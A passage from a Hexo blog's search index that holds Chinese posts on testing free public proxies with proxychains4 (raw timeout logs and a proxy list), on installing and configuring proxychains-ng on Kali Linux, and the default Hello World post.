timeout=2)&#39;))HTTPConnectionPool(host=&#39;185.235.41.85&#39;, port=80): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f66939a6af0&gt;, &#39;Connection to 185.235.41.85 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;175.110.204.95&#39;, port=8080): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f66939321f0&gt;, &#39;Connection to 175.110.204.95 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;103.87.170.80&#39;, port=58248): Read timed out. (read timeout=2)HTTPConnectionPool(host=&#39;104.43.230.151&#39;, port=3128): Read timed out. (read timeout=2)HTTPConnectionPool(host=&#39;103.83.156.225&#39;, port=80): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f66939895e0&gt;, &#39;Connection to 103.83.156.225 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;92.204.129.161&#39;, port=80): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693992e80&gt;, &#39;Connection to 92.204.129.161 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;143.198.57.246&#39;, port=3128): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f66939320a0&gt;, &#39;Connection to 143.198.57.246 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;51.222.220.236&#39;, port=32769): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693932ac0&gt;, &#39;Connection to 51.222.220.236 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;51.222.220.231&#39;, port=32769): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693932700&gt;, &#39;Connection to 51.222.220.231 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;194.233.64.34&#39;, port=80): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693992250&gt;, &#39;Connection to 194.233.64.34 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;61.37.223.152&#39;, port=8080): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693992490&gt;, &#39;Connection to 61.37.223.152 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;176.56.107.101&#39;, port=32161): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693989fd0&gt;, &#39;Connection to 176.56.107.101 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;51.222.220.247&#39;, port=32769): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693a0cdc0&gt;, &#39;Connection to 51.222.220.247 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;51.222.67.214&#39;, port=32769): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693a0c790&gt;, &#39;Connection to 51.222.67.214 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;51.222.220.241&#39;, port=32769): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f669393a1c0&gt;, &#39;Connection to 51.222.220.241 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;157.230.103.189&#39;, port=41208): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693a0ca00&gt;, &#39;Connection to 157.230.103.189 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;186.126.51.29&#39;, port=10809): Read timed out. (read timeout=2)# socks5 list from  http://proxylist.fatezero.org/proxy.listhttp  3.211.17.212  80http  18.204.234.136  80http  18.210.77.4  80http  3.224.69.117  80http  3.219.153.200  80http  194.71.227.187  8060# proxychains4 curl cip.cc[proxychains] config file found: /etc/proxychains.conf[proxychains] preloading /usr/lib/libproxychains4.so[proxychains] DLL init: proxychains-ng 4.14-git-41-g092d704[proxychains] Random chain  ...  3.211.17.212:80  ...  18.204.234.136:80 &lt;--denied[proxychains] Random chain  ...  194.71.227.187:8060  ...  3.219.153.200:80  ...  122.51.157.137:80 &lt;--socket error or timeout![proxychains] Random chain  ...  3.211.17.212:80  ...  3.219.153.200:80 &lt;--denied[proxychains] Random chain  ...  194.71.227.187:8060  ...  3.211.17.212:80  ...  122.51.162.249:80 &lt;--socket error or timeout!curl: (7) Couldn&#39;t connect to server</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 代理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> proxy </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali 安装 proxychains-ng (proxychains4)</title>
      <link href="2021/05/18/kali%20%E5%AE%89%E8%A3%85%20proxychains-ng%20(proxychains4)/"/>
      <url>2021/05/18/kali%20%E5%AE%89%E8%A3%85%20proxychains-ng%20(proxychains4)/</url>
      
        <content type="html"><![CDATA[<h2 id="一、ProxyChains-下载与安装"><a href="#一、ProxyChains-下载与安装" class="headerlink" title="一、ProxyChains 下载与安装"></a>一、ProxyChains 下载与安装</h2><p>由于 Kali Linux 系统测试这个系统中已经自带了 ProxyChains，因此就不多说了，但是我需要最新的，所以我就要自己重新下载安装。</p><p>ProxyChains 是一个开源代理工具，能够强制使任何应用的 TCP 连接使用 SOCKS4,SOCKS 或者 HTTP(S) 代理进行连接。</p><h3 id="卸载原来自带的proxychains"><a href="#卸载原来自带的proxychains" class="headerlink" title="卸载原来自带的proxychains"></a>卸载原来自带的proxychains</h3><pre><code>apt-get updateautoremove # 这样能卸载干净apt-get autoremove proxychains</code></pre><p>然后删除 proxychians.conf 配置文件:</p><pre><code>cp /ect/proxychains.conf /ect/proxychains.conf.bakrm -rf /ect/proxychains.conf</code></pre><h3 id="下载-proxychains-ng，并安装"><a href="#下载-proxychains-ng，并安装" class="headerlink" title="下载 proxychains-ng，并安装"></a>下载 proxychains-ng，并安装</h3><h4 id="源码编译安装"><a href="#源码编译安装" class="headerlink" title="源码编译安装"></a>源码编译安装</h4><p>下载源码</p><pre><code>git clone https://github.com/rofl0r/proxychains-ng.git</code></pre><p>编译安装</p><pre><code>cd proxychains-ng/./configure --prefix=/usr --sysconfdir=/etcmake &amp;&amp; make installmake install-config</code></pre><h2 id="二、proxychains-使用"><a href="#二、proxychains-使用" class="headerlink" title="二、proxychains 使用"></a>二、proxychains 使用</h2><p>使用前你需要有个已经有启用 V** 代理转发且转发通畅的端口，比如常见的 1080 端口。具体不必须说。如果不知道什么意思就不用再往下看了，知道有这个命令就可以了。</p><p>然后修改 proxychains 配置文件。默认目录是 /etc/proxychains.conf 文件，默认会给出一些[ProxyList]参数，我们直接直接挪到文件底部修改添加就可以了。</p><pre><code>$ vim proxychains.conf[ProxyList]socks5    127.0.0.1 1080</code></pre><p>上面的参数配置意思是 proxychains将所需要的命令通过sock5在1080端口转发，如果需要什么命令用到代理转发，执行</p><pre><code>proxychains4 + 命令</code></pre><p>proxychains4 这个神器解决了很多网络慢、卡和迷路的问题。有段时间在 github 上 git pull 和 push 极慢，通过这个代理转发之后，飞一样的感觉，如丝般顺滑。</p><h2 id="三、配置项详解"><a href="#三、配置项详解" class="headerlink" title="三、配置项详解"></a>三、配置项详解</h2><h3 id="代理类型"><a href="#代理类型" class="headerlink" title="代理类型"></a>代理类型</h3><p>dynamic_chain　自动跳过死代理<br>strict_chain　每个代理都使用，不管死活<br>random_chain 随便挑着代理用　（chain_len　是配置每次用的代理个数）</p><h3 id="代理dns请求"><a href="#代理dns请求" class="headerlink" title="代理dns请求"></a>代理dns请求</h3><p>proxy_dns</p><h3 id="跳过本地地址（proxychains-ng-目前值得一提的功能，ng才支持）"><a href="#跳过本地地址（proxychains-ng-目前值得一提的功能，ng才支持）" class="headerlink" title="跳过本地地址（proxychains ng 目前值得一提的功能，ng才支持）"></a>跳过本地地址（proxychains ng 目前值得一提的功能，ng才支持）</h3><p>localnet 127.0.0.0/255.0.0.0</p><h3 id="超时时间"><a href="#超时时间" class="headerlink" title="超时时间"></a>超时时间</h3><p>tcp_read_time_out 15000<br>tcp_connect_time_out 8000</p><h3 id="代理列表"><a href="#代理列表" class="headerlink" title="代理列表"></a>代理列表</h3><h4 id="代理列表开始的标记"><a href="#代理列表开始的标记" class="headerlink" title="代理列表开始的标记"></a>代理列表开始的标记</h4><p>[ProxyList]</p><h4 id="代理格式"><a href="#代理格式" class="headerlink" title="代理格式"></a>代理格式</h4><pre><code>type  host  port [user pass]每一项配置用　tab 或者空格　隔开</code></pre><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><pre><code>socks5    192.168.67.78    1080    lamer    secrethttp    192.168.89.3    8080    justu    hiddensocks4    192.168.1.49    1080http    192.168.39.93    8080    </code></pre><h2 id="四、参考文章"><a href="#四、参考文章" class="headerlink" title="四、参考文章"></a>四、参考文章</h2><p><a href="https://www.fujieace.com/kali-linux/proxychains.html" title="Kali Linux（Debian）代理工具：ProxyChains使用教程">Kali Linux（Debian）代理工具：ProxyChains使用教程</a></p><p><a href="https://blog.xofred.com/ss-in-mac-terminal/" title="Mac OSX 终端走 shadow***** 代理">Mac OSX 终端走 shadow***** 代理</a></p><p><a href="https://blog.fazero.me/2015/09/15/%E8%AE%A9%E7%BB%88%E7%AB%AF%E8%B5%B0%E4%BB%A3%E7%90%86%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/" title="让终端走代理的几种方法">让终端走代理的几种方法</a></p><p><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/11.html">https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/11.html</a></p><p><a href="https://blog.hl0rey.com/2018/02/03/proxychains%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/" title="proxychains配置详解">proxychains配置详解</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 代理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> proxy </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2021/05/14/hello-world/"/>
      <url>2021/05/14/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
